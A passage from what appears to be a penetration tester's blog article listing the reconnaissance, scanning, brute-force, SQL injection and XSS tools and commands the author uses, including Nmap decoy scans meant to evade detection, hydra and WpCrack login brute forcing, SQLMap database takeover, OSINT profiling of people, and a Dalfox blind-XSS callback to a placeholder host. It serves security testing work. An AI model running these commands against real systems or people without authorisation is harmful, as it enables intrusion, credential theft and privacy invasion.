+<p>It is worth adding API keys for better results:</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$HOME</span>/.config/finalrecon/keys.json</span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/owasp-amass/amass">Amass</a>
+ is network mapping of attack surfaces and external asset discovery 
+using open source information gathering and active reconnaissance 
+techniques.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">amass enum -d example.com</span><br></pre></td></tr></tbody></table></figure>
+
+<p>again, it is worth configuring different API’s for better results. The config file is here <code>$HOME/.config/amass/config.ini</code>.</p>
+<h3 id="WAF-check"><a href="#WAF-check" class="headerlink" title="WAF check"></a>WAF check</h3><p><a target="_blank" rel="noopener" href="https://github.com/EnableSecurity/wafw00f">wafw00f</a> to test if the application is hidden by the web application firewall.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wafw00f https://example.org</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="Namp"><a href="#Namp" class="headerlink" title="Namp"></a>Namp</h3><figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -T2 -sV --randomize-hosts -D RND:10 example.com</span><br></pre></td></tr></tbody></table></figure>
+
+<p><code>-sS</code>: SYN scan (half-open), which is less intrusive.</p>
+<p><code>-T2</code>: Sets the scanning speed to “polite,” which reduces the risk of detection by IDS/IPS.</p>
+<p><code>-sV</code>: Service version detection on open ports.</p>
+<p><code>--randomize-hosts</code>: Randomizes the order of hosts to scan.</p>
+<p><code>-D RND:10</code>: Decoy scan to obscure the actual source of the scan.</p>
+<p>You can use other scan types like:</p>
+<p><code>-sA</code>: TCP-ACK Scanning, check if ports are filtered, more can be found <a href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/2021/12/21/nmap/">here</a>.</p>
+<h3 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h3><p>To collect some details about users, emails, nicknames.</p>
+<p><a target="_blank" rel="noopener" href="https://kennbroorg.gitlab.io/ikyweb/">iKy</a> is a tool that collects information from an email and shows results in a nice visual interface.</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/amitrajputfff/Profil3r">Profil3r</a>
+ is an OSINT tool that allows you to find potential profiles of a person
+ on social networks, as well as their email addresses. Installed in <code>/opt</code> from GitHub as Python virtual environment.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt/Profil3r</span><br><span class="line">python3 -m venv .venv</span><br><span class="line"><span class="built_in">source</span> .venv/bin/activate</span><br><span class="line">python3 profil3r.py -p john doe</span><br></pre></td></tr></tbody></table></figure>
+
+<p>Online tools:</p>
+<p><a target="_blank" rel="noopener" href="https://osintframework.com/">OSINT Framework</a> + <a target="_blank" rel="noopener" href="https://osintframework.pl/">Polish alternative</a></p>
+<h2 id="Scanning-and-enumeration"><a href="#Scanning-and-enumeration" class="headerlink" title="Scanning and enumeration"></a>Scanning and enumeration</h2><p>Depending
+ on the result of the reconnaissance, e.g. CMS detected, services 
+running, I run other scanners, mainly vulnerability scanners, port 
+scanners or an all-in-one tool to collect as many attack vectors as 
+possible. To find live hosts and interact with them. Just to get more 
+details about specific ports, running services and software versions. 
+After scanning, I also do enumeration to extract detailed and specific 
+information from identified services. It is all about extracting users, 
+network shares, web server locations, configurations etc.</p>
+<h3 id="ZAP"><a href="#ZAP" class="headerlink" title="ZAP"></a>ZAP</h3><p>In this step, when I touch web application, I also run <a target="_blank" rel="noopener" href="https://www.zaproxy.org/">ZAP</a>. To crawl the website and run passive and active scans. You can also run Burp for this.</p>
+<h3 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h3><figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sC -O -T4 -oA scan &lt;IP&gt; <span class="comment">#Fast scan for the most 1000tcp ports used</span></span><br><span class="line">nmap -sV -sC -O -T4 -p - -oA fullfastscan &lt;IP&gt; <span class="comment">#Fast scan for all the ports</span></span><br><span class="line">nmap -sV -sC -O -p - -oA fullscan &lt;IP&gt; <span class="comment">#Scan every tcp port to know exactly what is running in that machine</span></span><br><span class="line">nmap -sV -sC -T  <span class="comment">#Check if any of the 1000 most common udp ports are running</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p><code>-sC</code>: default scripts<br><code>-sV</code>: service version<br><code>-O:</code> operating system<br><code>-oA</code>: output filename<br><code>-T4</code>: aggressive fast scan</p>
+<p>And I also use <a target="_blank" rel="noopener" href="https://github.com/scipag/vulscan">vulscan</a> (Advanced vulnerability scanning with Nmap NSE).</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV --script=vulscan example.com</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="General-vulnerability-scanners"><a href="#General-vulnerability-scanners" class="headerlink" title="General vulnerability scanners"></a>General vulnerability scanners</h3><p><a target="_blank" rel="noopener" href="https://github.com/sullo/nikto">Nikto</a> is a web server vulnerability scanner.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -host http://example.com/ -o /results.html</span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/wapiti-scanner/wapiti">Wapiti</a> is web vulnerability scanner written in Python3.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wapiti -u http://example.com/</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="Skipfish"><a href="#Skipfish" class="headerlink" title="Skipfish"></a>Skipfish</h3><p><a target="_blank" rel="noopener" href="https://www.kali.org/tools/skipfish/">Skipfish</a>?
+ Someone may ask why, this tool is old and has not been developed for 10
+ years or more. However, I find it useful for old technology sites.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">skipfish -o output_directory -S /path/to/dictionary example.com</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="Other-scanners-and-tests"><a href="#Other-scanners-and-tests" class="headerlink" title="Other scanners and tests"></a>Other scanners and tests</h3><p><a target="_blank" rel="noopener" href="https://github.com/rbsec/sslscan">SSLScan</a> tests SSL/TLS-enabled services to determine supported cipher suites.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sslscan example.com</span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/MrCl0wnLab/ShellShockHunter">ShellShockHunter</a> it’s a simple tool for testing the shellshock vulnerability.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python main.py --range <span class="string">'194.206.187.X,194.206.187.XXX'</span> --check --thread 40 --ssl</span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/blacklanternsecurity/bbot">Bbot</a> a recursive internet scanner for hackers.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Port-scan every subdomain, screenshot every webpage, output to current directory</span></span><br><span class="line">bbot -t example.com -f subdomain-enum -m nmap gowitness -n my_scan -o .</span><br><span class="line"><span class="comment"># A basic web scan includes wappalyzer, robots.txt, and other non-intrusive web modules</span></span><br><span class="line">bbot -t example.com -f subdomain-enum web-basic</span><br><span class="line"><span class="comment"># Crawl www.evilcorp.com up to a max depth of 2, automatically extracting emails, secrets, etc.</span></span><br><span class="line">bbot -t www.example.com -m httpx robots badsecrets secretsdb -c web_spider_distance=2 web_spider_depth=2</span><br><span class="line"><span class="comment"># Subdomains, emails, cloud buckets, port scan, basic web, web screenshots, nuclei</span></span><br><span class="line">bbot -t example.com -f subdomain-enum email-enum cloud-enum web-basic -m nmap gowitness nuclei --allow-deadly</span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/h4r5h1t/webcopilot">Webcopilot</a>
+ an automation tool that enumerates subdomains then filters out xss, 
+sqli, open redirect, lfi, ssrf and rce parameters and then scans for 
+vulnerabilities.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webcopilot -d http://example.com/ -a -b &lt;backend_URL&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>as a backend I use <a target="_blank" rel="noopener" href="https://portswigger.net/burp/documentation/collaborator">Burp collaborator</a> or <a target="_blank" rel="noopener" href="https://app.interactsh.com/">InteractSH</a>.</p>
+<h3 id="CMS-Scanners"><a href="#CMS-Scanners" class="headerlink" title="CMS Scanners"></a>CMS Scanners</h3><p>For scanning specific CMS. Installed in <code>/opt</code> from GitHub.</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/anouarbensaad/vulnx">Vulnx</a> an intelligent Bot, Shell can achieve automatic injection, and help researchers detect security vulnerabilities CMS system.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vulnx -u http://example.com/ -w -d --dns -o /test</span><br></pre></td></tr></tbody></table></figure>
+
+<p><code>-u</code>: url target</p>
+<p><code>-w</code>: web information gathering</p>
+<p><code>-d</code>: subdomains information gathering</p>
+<p><code>--dns</code>: dns information gathering</p>
+<p><code>-e</code> for exploiting</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Tuhinshubhra/CMSeeK">CMSeeK</a> CMS Detection and Exploitation suite - Scan WordPress, Joomla, Drupal and over 180 other CMSs. Installed in <code>/opt</code> from GitHub.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cmseek.py -u https://example.com</span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/wpscanteam/wpscan">WPScan</a> WordPress security scanner.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://example.com/ -e -U -o /wpscan --api-token=WordPress Vulnerability Database API</span><br></pre></td></tr></tbody></table></figure>
+
+<p><code>--url</code>: domain url</p>
+<p><code>-e</code>: enumeration</p>
+<p><code>-U</code>: users list</p>
+<p><code>-o</code>: output to FILE</p>
+<p><code>--api-token</code>: <a target="_blank" rel="noopener" href="https://wpscan.com/api">WordPress Vulnerability Database API</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/22XploiterCrew-Team/WpCrack">WpCrack</a> is an audit and brute force tool used to remotely test WordPress blogging software. Installed in <code>/opt</code> from GitHub.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python WpCrack.py -t http://exmaple.com/wp-login.php -u admin --p wordlist.txt</span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/OWASP/joomscan">Joomscan</a> Joomla vulnerability scanner.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joomscan -u http://example.com/</span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/oppsec/juumla">juumla</a> is a python tool created to identify Joomla version, scan for vulnerabilities and sensitive files. Installed in <code>/opt</code> from GitHub.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 main.py -u https://example.com</span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/mIcHyAmRaNe/okadminfinder">OKadminFinder</a> admin/login panel finder. Installed in <code>/opt</code> from GitHub.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">okadminfinder -u example.com -r</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="Subdomains"><a href="#Subdomains" class="headerlink" title="Subdomains"></a>Subdomains</h3><p>Build a list of subdomains to expand the scope of the attack, or take them over if possible.</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/subfinder">Subfinder</a> fast passive subdomain enumeration tool</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">subfinder -d example.com -v -all -o subdomains.txt</span><br></pre></td></tr></tbody></table></figure>
+
+<p>It is worth to configure <a target="_blank" rel="noopener" href="https://docs.projectdiscovery.io/tools/subfinder/install#post-install-configuration">API’s</a> for better results.</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/guelfoweb/knock">Knock</a> Subdomain Scan. Installed in <code>/opt</code> from GitHub.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">knockpy -d example.com --recon --bruteforce --save report</span><br><span class="line">knockpy --report example.com_yyyy_aa_dd_hh_mm_ss.json <span class="comment">#show report</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/blacklanternsecurity/bbot">Bbot</a> a recursive internet scanner for hackers. Installed in <code>/opt</code> from GitHub.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bbot -t example.com -f subdomain-enum</span><br><span class="line"><span class="comment"># Perform a passive-only subdomain enumeration on evilcorp.com</span></span><br><span class="line">bbot -t example.com -f subdomain-enum -rf passive</span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/punk-security/dnsReaper">dnsReaper</a> subdomain takeover tool for attackers. Installed in <code>/opt</code> from GitHub as Python virtual environment.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python main.py --domain example.com</span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/PentestPad/subzy">Subzy</a> subdomain takeover vulnerability checker. Generate manually list from Subfinder or Bbot and add it as targets in Subzy.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./subzy run --targets subdomains.txt</span><br></pre></td></tr></tbody></table></figure>
+
+<p>You may also be interested in one of my previous articles on the <a href="https://reycdxyc24gf7jrnwutzdn3smmweizedy7uojsa7ols6sflwu25ijoyd.onion/2020/08/05/subdomain-takeover/">subdomain takeover task</a>.</p>
+<h3 id="Fuzzing-and-bruteforcing"><a href="#Fuzzing-and-bruteforcing" class="headerlink" title="Fuzzing and bruteforcing"></a>Fuzzing and bruteforcing</h3><p>For any tool related to wordlists I use <a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists">SecLists</a>, <a target="_blank" rel="noopener" href="https://github.com/fuzzdb-project/fuzzdb">fuzzdb</a>, <a target="_blank" rel="noopener" href="https://github.com/0xspade/Combined-Wordlists">Combined-Wordlists</a> and <a target="_blank" rel="noopener" href="https://github.com/kaimi-io/web-fuzz-wordlists">web-fuzz-wordlists</a>. Most of the things described below can also be done in ZAP using the same wordlists.</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ffuf/ffuf">Fuff</a> - fast web fuzzer written in Go, mostly for directory or files discovery.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /path/to/wordlist -u https://example.com/FUZZ</span><br><span class="line">ffuf -w /path/to/vhost/wordlist -u https://example.com -H <span class="string">"Host: FUZZ"</span> -fs 4242</span><br><span class="line">ffuf -w /path/to/paramnames.txt -u https://example.com/script.php?FUZZ=test_value -fs 4242</span><br></pre></td></tr></tbody></table></figure>
+
+<p>I use <a target="_blank" rel="noopener" href="https://github.com/jim3ma/crunch">Crunch</a>, <a target="_blank" rel="noopener" href="https://github.com/digininja/CeWL">CeWL</a>, <a target="_blank" rel="noopener" href="https://github.com/r3nt0n/bopscrk">bopscrk</a> and <a target="_blank" rel="noopener" href="https://github.com/OsmanKandemir/web-wordlist-generator">web-wordlist-generator</a> as Python virtual environment) to generate my custom wordlist.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">crunch 3 3 0123456789ABCDEF -o passwords.txt</span><br><span class="line">or</span><br><span class="line">cewl -d 2 -m 5 -w passwords.txt http://example.com --with-numbers</span><br><span class="line">or</span><br><span class="line">cewl -d 0 -m 5 -w usernames.txt http://example.com/team.php --lowercase</span><br></pre></td></tr></tbody></table></figure>
+
+<p>and then, for example, bruteforce the credentials:</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs <span class="string">"Please enter the correct credentials"</span> -u http://target.com/login.php -d <span class="string">"username=FUZZ&amp;password=FUZ2Z"</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>of course I also use <a target="_blank" rel="noopener" href="https://github.com/vanhauser-thc/thc-hydra">thc-hydra</a> like everyone else for bruteforcing.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -L passwords.txt -P 3digits.txt -f -v http://example.com/ http-post-form <span class="string">"/login.php:pin=^PASS^:Access denied"</span> -s 8000</span><br><span class="line">hydra -L user.txt -P pass.txt IP_Address smb</span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/epi052/feroxbuster">Feroxbuster</a>
+ a fast, simple, recursive content discovery tool written in Rust. It is
+ also great alternative to the one already mentioned for forced 
+browsing.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./feroxbuster -u http://example.com -x pdf -x js,html -x php txt json,docx -s 200 301 302 --random-agent</span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/maurosoria/dirsearch">Dirsearch</a> is cool web path scanner.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u https://example.com</span><br><span class="line">python3 dirsearch.py -e php,html,js -u https://example.com</span><br><span class="line">python3 dirsearch.py -e php,html,js -u https://example.com -w /path/to/wordlist</span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/OJ/gobuster">Gobuster</a> last but not least, a directory/file, DNS and VHost busting tool written in Go.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gobuster dns -d example.com -t 50 -w common-names.txt</span><br><span class="line">gobuster <span class="built_in">dir</span> -u https://example.com/path/to/folder -c <span class="string">'session=123456'</span> -t 50 -w common-files.txt -x .php,.html</span><br><span class="line">gobuster fuzz -u https://example.com?FUZZ=<span class="built_in">test</span> -w parameter-names.txt</span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/glitchedgitz/cook">cook</a>
+ is a wordlist framework that allows you to do whatever you want with 
+your wordlists :) It is so complicated that you should read all about it
+ in the official repo.</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/M4DM0e/DirDar">DirDar</a> is a tool that searches for (403-forbidden) directories to break them and get dir listing on them, worth mentioning.</p>
+<p>Interesting for bruteforce web login is <a target="_blank" rel="noopener" href="https://github.com/koutto/web-brutator">web-brutator</a>. Old, but works. Installed in <code>/opt</code> from GitHub.</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/EntySec/Shreder">Shreder</a> is a powerful multi-threaded SSH protocol password brute-force tool.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shreder 192.168.1.100 -u username -l passwords.txt</span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/evilsocket/legba">Legba</a> a multiprotocol credentials bruteforcer/password sprayer and enumerator. Cool alternative to thc-hydra.</p>
+<h3 id="SQLi"><a href="#SQLi" class="headerlink" title="SQLi"></a>SQLi</h3><p>For SQL injection, it is worth getting a list of URLs with parameters, e.g. from ZAP/Burp or another crawler.</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/stamparm/DSSS">DSSS</a> Damn Small SQLi Scanner. Installed in <code>/opt</code> from GitHub.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dsss.py -u <span class="string">"http://example.com/index.php?parameter=1"</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap">SQLMap</a> automatic SQL injection and database takeover tool.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -u <span class="string">"https://example.com/index.php?id=1"</span> --batch --banner</span><br><span class="line">python3 sqlmap.py -u <span class="string">"https://example.com/index.php?id=1"</span> -f --banner --dbs --<span class="built_in">users</span></span><br><span class="line">python3 sqlmap.py -m list.txt --batch --banner</span><br></pre></td></tr></tbody></table></figure>
+
+<p>You can also crawl using SQLMap:</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://example.com/"</span> --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3</span><br><span class="line"></span><br><span class="line">--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers</span><br><span class="line">--crawl = how deep you want to crawl a site</span><br><span class="line">--forms = Parse and <span class="built_in">test</span> forms</span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/ron190/jsql-injection">jSQL Injection</a> is a Java application for automatic SQL database injection. GUI tool. Downloaded to <code>/opt</code> from GitHub.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jsql-injection-v0.101.jar</span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/Cvar1984/sqlscan">sqlscan</a> - is quick web scanner for find an sql inject point.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlscan http://example.com --scan</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>These
+ tools are no longer actively developed, but they work fine. The XSS 
+vulnerability is so old and still detectable, and literally nothing is 
+changing on the security or attack side, that these tools are still 
+useful. Besides, ZAP or Burp detect the same thing.</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/hahwul/dalfox">Dalfox</a> is a powerful open-source XSS scanner and utility focused on automation.</p>
+<figure class="highlight bash"><span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="fa-regular fa-clone"></i></span><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dalfox url http://example.com/listproducts.php\?<span class="built_in">cat</span>\=123\&amp;artist\=123\&amp;asdf\=ff -b https://your-callback-url</span><br><span class="line">dalfox file urls_file --custom-payload ./mypayloads.txt</span><br></pre></td></tr></tbody></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/s0md3v/XSStrike">XSStrike</a> most advanced XSS scanner. Installed in <code>/opt</code> from GitHub.</p>
